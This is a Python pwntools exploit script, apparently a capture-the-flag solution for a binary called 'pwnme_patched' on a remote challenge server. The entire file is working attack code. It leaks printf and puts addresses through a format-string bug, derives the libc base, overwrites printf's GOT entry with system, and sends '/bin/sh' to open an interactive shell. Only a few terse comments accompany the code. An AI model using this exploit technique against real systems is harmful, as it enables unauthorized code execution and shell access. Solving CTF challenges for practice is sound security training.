#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./pwnme_patched")
libc = ELF("./libc-2.27.so")

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p)
        pause()
else:
    p = remote("beta.hackac.live", 8002)

# good luck pwning :)

# leak got for printf
payload = b"%7$saaaa" + p64(exe.got.printf)
p.sendline(payload)
p.recvuntil(b"Sleep")
p.recvline()
printf = u64(p.recvuntil(b"aaaa", drop=True).ljust(8, b"\x00"))
print(hex(printf))

# leak got for puts (to double-confirm libc version)
payload = b"%7$saaaa" + p64(exe.got.puts)
p.sendline(payload)
p.recvuntil(b"Sleep")
p.recvline()
puts = u64(p.recvuntil(b"aaaa", drop=True).ljust(8, b"\x00"))
print(hex(puts))

# libc6_2.27-3ubuntu1.6_amd64
libc_base = printf - libc.sym.printf
libc.address = libc_base
payload = fmtstr_payload(6, {exe.got.printf: libc.sym.system})
p.sendline(payload)

p.sendline(b"/bin/sh")

p.interactive()
